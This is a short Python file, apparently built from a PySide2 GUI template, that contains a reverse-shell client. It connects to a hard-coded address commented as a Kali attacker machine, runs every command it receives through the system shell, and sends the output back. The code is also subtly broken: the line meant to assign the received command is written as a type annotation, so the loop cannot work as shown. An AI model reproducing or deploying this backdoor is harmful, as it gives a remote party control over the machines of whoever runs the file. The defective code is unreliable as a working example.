# This Python file uses the following encoding: utf-8
from PySide2 import QtWidgets
import socket
import subprocess

def connect():
    s = socket.socket()
    s.connect(("192.168.0.152",8080)) #Adress IP Kali + port
    while True:
        command : s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        else:
            CMD = subprocess.Popen(command.decode(),shell=True, stdout = subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()
main()
